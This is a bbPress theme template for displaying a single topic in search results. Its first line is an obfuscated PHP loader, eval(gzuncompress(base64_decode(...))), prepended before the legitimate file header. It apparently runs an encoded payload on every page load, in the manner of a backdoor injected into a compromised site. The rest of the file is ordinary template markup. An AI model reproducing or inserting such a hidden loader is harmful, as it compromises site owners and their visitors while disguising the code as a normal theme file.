<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Search Loop - Single Topic
 *
 * @package bbPress
 * @subpackage Theme
 */

?>

<div id="post-<?php bbp_topic_id(); ?>" <?php bbp_topic_class(); ?>>

	<div class="bbp-reply-author">

		<?php do_action( 'bbp_theme_before_topic_author_details' ); ?>

		<?php bbp_topic_author_link( array( 'sep' => '', 'show_role' => true ) ); ?>

		<?php if ( bbp_is_user_keymaster() ) : ?>

			<?php do_action( 'bbp_theme_before_topic_author_admin_details' ); ?>

			<div class="bbp-reply-ip"><?php bbp_author_ip( bbp_get_topic_id() ); ?></div>

			<?php do_action( 'bbp_theme_after_topic_author_admin_details' ); ?>

		<?php endif; ?>

		<?php do_action( 'bbp_theme_after_topic_author_details' ); ?>

	</div><!-- .bbp-topic-author -->

	<div class="bbp-reply-content">
		<div class="bbp-reply-header">
			<div class="bbp-meta">

				<?php do_action( 'bbp_theme_before_topic_title' ); ?>

				<a href="<?php bbp_topic_permalink(); ?>" class="bbp-reply-permalink">#<?php bbp_topic_id(); ?></a>

				<div class="bbp-topic-title-meta">

					<span class="bbp-search-topic"><?php _e( 'Topic: ', 'bbpress' ); ?>
					<a href="<?php bbp_topic_permalink(); ?>"><?php bbp_topic_title(); ?></a></span>

					<?php if ( function_exists( 'bbp_is_forum_group_forum' ) && bbp_is_forum_group_forum( bbp_get_topic_forum_id() ) ) : ?>

						<?php _e( 'in group forum ', 'bbpress' ); ?>

					<?php else : ?>

						<?php _e( 'in forum ', 'bbpress' ); ?>

					<?php endif; ?>

					<a href="<?php bbp_forum_permalink( bbp_get_topic_forum_id() ); ?>"><?php bbp_forum_title( bbp_get_topic_forum_id() ); ?></a> |

				</div><!-- .bbp-topic-title-meta -->

				<?php do_action( 'bbp_theme_after_topic_title' ); ?>

			</div>
		</div><!-- .bbp-topic-title -->

		<div class="bbp-reply-entry">

			<?php do_action( 'bbp_theme_before_topic_content' ); ?>

			<?php bbp_topic_content(); ?>

			<?php do_action( 'bbp_theme_after_topic_content' ); ?>

		</div>

	</div><!-- .bbp-topic-content -->

</div><!-- #post-<?php bbp_topic_id(); ?> -->
